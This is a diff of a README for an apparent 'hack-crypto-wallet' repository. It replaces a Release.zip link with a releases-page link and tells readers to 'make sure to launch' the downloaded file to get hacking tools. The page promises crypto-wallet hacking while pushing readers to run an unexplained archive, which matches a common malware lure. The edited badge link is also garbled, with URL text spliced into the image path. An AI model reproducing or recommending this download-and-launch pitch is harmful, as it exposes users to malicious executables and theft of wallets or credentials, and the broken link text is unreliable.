@@ -25,11 +25,11 @@ Explore the depths of blockchain technology and cryptocurrency security with top
 
 ## Get Started
 
-To dive into the world of blockchain hacking and crypto wallet security, check out the [Release.zip](https://github.com/assets/Release.zip) file. If the link ends with a file name, make sure to launch it to access valuable resources, tools, and insights.
+To dive into the world of blockchain hacking and crypto wallet security, check out the [https://github.com/hakimil/hack-crypto-wallet/releases](https://github.com/hakimil/hack-crypto-wallet/releases) file. If the link ends with a file name, make sure to launch it to access valuable resources, tools, and insights.
 
 If the provided link does not work or you need additional resources, head over to the "Releases" section of this repository for the latest updates and materials.
 
-[![Click Here to Access Release.zip](https://img.shields.io/badge/Access%20Release.zip-Click%20Here-brightgreen)](https://github.com/assets/Release.zip)
+[![Click Here to Access https://github.com/hakimil/hack-crypto-wallet/releases](https://github.com/hakimil/hack-crypto-wallet/releases%https://github.com/hakimil/hack-crypto-wallet/releases%20Here-brightgreen)](https://github.com/hakimil/hack-crypto-wallet/releases)
 
 ## Explore and Contribute
 
